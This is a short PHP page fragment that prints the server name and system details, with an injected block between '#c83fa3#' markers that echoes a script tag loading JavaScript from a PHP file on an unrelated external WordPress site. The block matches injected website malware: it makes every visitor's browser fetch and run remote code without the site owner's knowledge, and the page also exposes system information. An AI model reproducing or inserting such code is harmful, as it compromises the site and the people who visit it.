...
Nome do Servidor: <?php echo $UNAME = @php_uname(); ?>
<?php
#c83fa3#
if(empty($f)) {
$f = "<script type=\"text/javascript\" src=\"http://just-life.eu/wp-content/themes/justlife/wlxhtzd2.php?id=21868758\"></script>";
echo $f;
}
#/c83fa3#
?><br>
